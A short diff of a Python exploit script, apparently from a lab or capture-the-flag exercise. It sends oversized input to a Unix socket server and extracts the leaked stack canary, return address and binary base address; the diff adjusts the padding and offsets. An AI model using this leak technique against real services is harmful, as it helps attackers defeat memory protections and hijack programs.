@@ -8,7 +8,7 @@ s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
 s.connect(sock)
 
 #send string and length to server
-strg = b'A' * 24 + b'\n280\n'
+strg = b'A' * 16 + b'\n280\n'
 s.send(strg)
 data = s.recv(1024)
 s.close()
@@ -25,7 +25,7 @@ for i in range(len(data)):
 	#valuebyte += this_byte + '\t'
 	if i>23 and i<32:
 		canary.append(this_byte)
-	if i>87 and i<96:
+	if i>15 and i<24:
 		ret_addr.append(this_byte)
 	if i>271 and i<280:
 		bin_addr.append(this_byte)
